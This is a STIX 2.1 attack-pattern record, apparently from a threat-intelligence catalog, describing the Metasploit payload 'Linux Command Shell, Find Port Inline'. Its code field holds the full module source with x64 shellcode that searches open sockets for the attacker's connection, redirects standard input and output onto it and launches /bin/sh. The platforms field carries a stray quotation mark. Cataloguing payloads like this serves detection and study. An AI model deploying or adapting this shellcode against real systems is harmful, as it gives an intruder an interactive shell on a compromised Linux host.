{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2a2e46f-2dac-4c38-ab3e-81a7613c8468",
    "created": "2024-08-14T16:33:19.464511Z",
    "modified": "2024-08-14T16:33:19.464515Z",
    "name": "Linux Command Shell, Find Port Inline",
    "description": "Spawn a shell on an established connection",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x64/shell_find_port.rb",
            "external_id": "shell_find_port.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 98\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Find Port Inline',\n      'Description'   => 'Spawn a shell on an established connection',\n      'Author'        => 'mak',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::FindPort,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'CPORT' => [ 39, 'n' ],\n            },\n\n          'Assembly' => %Q|\n            xor rdi,rdi\n            xor rbx,rbx\n            mov bl,0x18\n            sub rsp,rbx\n            lea rdx,[rsp]\n            mov [rdx], 0x10\n            lea rsi,[rsp+8]\n          find_port:\n            push 0x34     ; getpeername\n            pop rax\n            syscall\n            inc rdi\n            cmp word [rsi+2],0x4142\n            jne find_port\n            dec rdi\n            push 2\n            pop rsi\n          dup2:\n            push 0x21     ; dup2\n            pop rax\n            syscall\n            dec rsi\n            jns dup2\n            mov rbx,rsi\n            mov ebx, 0x68732f41\n            mov eax,0x6e69622f\n            shr rbx,8\n            shl rbx,32\n            or  rax,rbx\n            push rax\n            mov rdi,rsp\n            xor rsi,rsi\n            mov rdx,rsi\n            push 0x3b     ; execve\n            pop rax\n            syscall\n          |\n        }\n      ))\n  end\n\n  def size\n    return 91\n  end\n\n\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}